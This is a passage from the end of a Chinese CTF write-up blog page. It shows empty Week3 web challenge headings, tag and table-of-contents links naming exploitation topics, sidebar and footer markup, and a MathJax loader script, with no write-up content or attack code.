<h2 id="Pwn-1"><a href="#Pwn-1" class="headerlink" title="Pwn"></a>Pwn</h2><h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="路在脚下"><a href="#路在脚下" class="headerlink" title="路在脚下"></a>路在脚下</h3><h3 id="西纳普斯的许愿碑"><a href="#西纳普斯的许愿碑" class="headerlink" title="西纳普斯的许愿碑"></a>西纳普斯的许愿碑</h3><h3 id="Image-Viewer"><a href="#Image-Viewer" class="headerlink" title="Image Viewer"></a>Image Viewer</h3><h3 id="PDF-Viewer"><a href="#PDF-Viewer" class="headerlink" title="PDF Viewer"></a>PDF Viewer</h3><h3 id="Xross-The-Doom"><a href="#Xross-The-Doom" class="headerlink" title="Xross The Doom"></a>Xross The Doom</h3><h3 id="路在脚下-revenge"><a href="#路在脚下-revenge" class="headerlink" title="路在脚下_revenge"></a>路在脚下_revenge</h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/10/30/%E7%AC%AC16%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">https://sakuraraindrop.github.io/2025/10/30/%E7%AC%AC16%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a><a class="post-meta__tags" href="/tags/xss/">xss</a><a class="post-meta__tags" href="/tags/ret2libc/">ret2libc</a><a class="post-meta__tags" href="/tags/ret2csu/">ret2csu</a><a class="post-meta__tags" href="/tags/ret2text/">ret2text</a><a class="post-meta__tags" href="/tags/md5/">md5</a><a class="post-meta__tags" href="/tags/ejs%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">ejs模板注入</a><a class="post-meta__tags" href="/tags/MCP/">MCP</a><a class="post-meta__tags" href="/tags/Blockchain/">Blockchain</a><a class="post-meta__tags" href="/tags/sage/">sage</a><a class="post-meta__tags" href="/tags/env%E6%8F%90%E6%9D%83/">env提权</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/10/29/20251029%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20251029随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">20251029随缘刷题</div></div></div></a><a class="pagination-related  no-desc" href="/2025/10/31/ret2libc/" title="ret2libc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ret2libc</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/10/31/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/" title="基础栈溢出"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-31</div><div class="info-item-2">基础栈溢出</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/04/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="2024春秋杯夏季赛复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">2024春秋杯夏季赛复现</div></div></div></a><a class="pagination-related no-desc" href="/2025/05/26/LitCTF2025/" title="LitCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-26</div><div class="info-item-2">LitCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/08/17/LilCTF/" title="LilCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">LilCTF</div></div></div></a><a class="pagination-related no-desc" href="/2025/09/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-04</div><div class="info-item-2">PHP反序列化</div></div></div></a><a class="pagination-related no-desc" href="/2025/09/03/20250903%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250903随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-03</div><div class="info-item-2">20250903随缘刷题</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">72</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">163</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1"><span class="toc-number">1.</span> <span class="toc-text">Week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%BF%E5%9F%BA%E9%87%8C%E6%96%AF%E8%BF%BD%E4%B9%8C%E9%BE%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">阿基里斯追乌龟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vibe-SEO"><span class="toc-number">1.1.2.</span> <span class="toc-text">Vibe SEO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xross-The-Finish-Line"><span class="toc-number">1.1.3.</span> <span class="toc-text">Xross The Finish Line</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Expression"><span class="toc-number">1.1.4.</span> <span class="toc-text">Expression</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#one-last-image"><span class="toc-number">1.1.5.</span> <span class="toc-text">one_last_image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popself"><span class="toc-number">1.1.6.</span> <span class="toc-text">popself</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP"><span class="toc-number">1.2.1.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%97%83%EF%B8%8F%F0%9F%97%83%EF%B8%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">🗃️🗃️</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#evil-mcp"><span class="toc-number">1.2.3.</span> <span class="toc-text">evil_mcp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bite-off-picture"><span class="toc-number">1.2.4.</span> <span class="toc-text">Bite off picture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1Z-Sign"><span class="toc-number">1.2.5.</span> <span class="toc-text">1Z_Sign</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blockchain-SignIn"><span class="toc-number">1.2.6.</span> <span class="toc-text">Blockchain SignIn</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">1.3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#encode"><span class="toc-number">1.3.1.</span> <span class="toc-text">encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-pyyy"><span class="toc-number">1.3.2.</span> <span class="toc-text">ez_pyyy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#only-flower"><span class="toc-number">1.3.3.</span> <span class="toc-text">only_flower</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%9A%E4%BD%8D%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">花指令定位与修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E5%A4%8D%E5%8E%9F"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">逻辑复原</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%EF%BC%88Python%EF%BC%89"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">解密脚本（Python）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8-IDA-%E4%B8%AD%E6%89%8B%E5%8A%A8%E5%AF%B9%E4%BB%98%E8%8A%B1%E6%8C%87%E4%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%84"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">在 IDA 中手动对付花指令的小抄</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRu3t"><span class="toc-number">1.3.4.</span> <span class="toc-text">ezRu3t</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">关键函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E5%AE%9A%E4%BD%8D"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">关键信息定位</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A8%E5%AF%BC%E4%B8%8E%E8%BF%98%E5%8E%9F"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">推导与还原</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">解题脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QYQS%E3%81%AE%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A9"><span class="toc-number">1.3.5.</span> <span class="toc-text">QYQSの奇妙冒险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezSMC"><span class="toc-number">1.3.6.</span> <span class="toc-text">ezSMC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">关键分析过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%85%A5%E5%8F%A3%E4%B8%8E%E6%8F%90%E7%A4%BA%E4%B8%B2"><span class="toc-number">1.3.6.1.1.</span> <span class="toc-text">1) 入口与提示串</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%B8%BB%E6%B5%81%E7%A8%8B%E5%8F%8D%E7%BC%96%E8%AF%91%E8%A6%81%E7%82%B9"><span class="toc-number">1.3.6.1.2.</span> <span class="toc-text">2) 主流程反编译要点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.6.1.3.</span> <span class="toc-text">3) 逆向思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC-1"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">解题脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-xor"><span class="toc-number">1.4.1.</span> <span class="toc-text">ez_xor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Caesar-Slot-Machine"><span class="toc-number">1.4.2.</span> <span class="toc-text">Caesar Slot Machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-ecc"><span class="toc-number">1.4.3.</span> <span class="toc-text">ez_ecc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pem"><span class="toc-number">1.4.4.</span> <span class="toc-text">pem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-rabin"><span class="toc-number">1.4.5.</span> <span class="toc-text">baby_rabin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#old-rop"><span class="toc-number">1.5.1.</span> <span class="toc-text">old_rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">ret2csu</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Calculator"><span class="toc-number">1.5.2.</span> <span class="toc-text">Mission Calculator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Cipher-Text"><span class="toc-number">1.5.3.</span> <span class="toc-text">Mission Cipher Text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Exception-Registration"><span class="toc-number">1.5.4.</span> <span class="toc-text">Mission Exception Registration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AC%A1%E5%85%83%E5%9B%9A%E7%AC%BC"><span class="toc-number">1.5.5.</span> <span class="toc-text">次元囚笼</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week2"><span class="toc-number">2.</span> <span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number">2.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sequal-No-Uta"><span class="toc-number">2.1.1.</span> <span class="toc-text">Sequal No Uta</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-read"><span class="toc-number">2.1.2.</span> <span class="toc-text">ez_read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BE%E5%B9%B4%E7%BB%A7%E6%89%BF"><span class="toc-number">2.1.3.</span> <span class="toc-text">百年继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-seralize"><span class="toc-number">2.1.4.</span> <span class="toc-text">ez-seralize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eeeeezzzzzzZip"><span class="toc-number">2.1.5.</span> <span class="toc-text">eeeeezzzzzzZip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc-1"><span class="toc-number">2.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dream"><span class="toc-number">2.2.1.</span> <span class="toc-text">Dream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hidden"><span class="toc-number">2.2.2.</span> <span class="toc-text">hidden</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Expression-Parser"><span class="toc-number">2.2.3.</span> <span class="toc-text">Expression Parser</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-1"><span class="toc-number">2.3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gensh1n"><span class="toc-number">2.3.1.</span> <span class="toc-text">Gensh1n</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-1"><span class="toc-number">2.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xor-revenge"><span class="toc-number">2.4.1.</span> <span class="toc-text">xor_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dp-spill"><span class="toc-number">2.4.2.</span> <span class="toc-text">dp_spill</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-1"><span class="toc-number">2.5.</span> <span class="toc-text">Pwn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Week3"><span class="toc-number">3.</span> <span class="toc-text">Week3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-2"><span class="toc-number">3.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%9C%A8%E8%84%9A%E4%B8%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text">路在脚下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A5%BF%E7%BA%B3%E6%99%AE%E6%96%AF%E7%9A%84%E8%AE%B8%E6%84%BF%E7%A2%91"><span class="toc-number">3.1.2.</span> <span class="toc-text">西纳普斯的许愿碑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Image-Viewer"><span class="toc-number">3.1.3.</span> <span class="toc-text">Image Viewer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PDF-Viewer"><span class="toc-number">3.1.4.</span> <span class="toc-text">PDF Viewer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xross-The-Doom"><span class="toc-number">3.1.5.</span> <span class="toc-text">Xross The Doom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%9C%A8%E8%84%9A%E4%B8%8B-revenge"><span class="toc-number">3.1.6.</span> <span class="toc-text">路在脚下_revenge</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/02/20251202%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20251202随缘刷题">20251202随缘刷题</a><time datetime="2025-12-01T16:26:54.000Z" title="发表于 2025-12-02 00:26:54">2025-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/01/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">原型链污染</a><time datetime="2025-12-01T01:54:55.000Z" title="发表于 2025-12-01 09:54:55">2025-12-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/28/20251128%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" title="20251128论文学习">20251128论文学习</a><time datetime="2025-11-28T02:24:00.000Z" title="发表于 2025-11-28 10:24:00">2025-11-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/05/0xGame2025/" title="0xGame2025">0xGame2025</a><time datetime="2025-11-05T10:51:18.000Z" title="发表于 2025-11-05 18:51:18">2025-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/" title="强网杯S9-web">强网杯S9-web</a><time datetime="2025-11-04T06:24:51.000Z" title="发表于 2025-11-04 14:24:51">2025-11-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>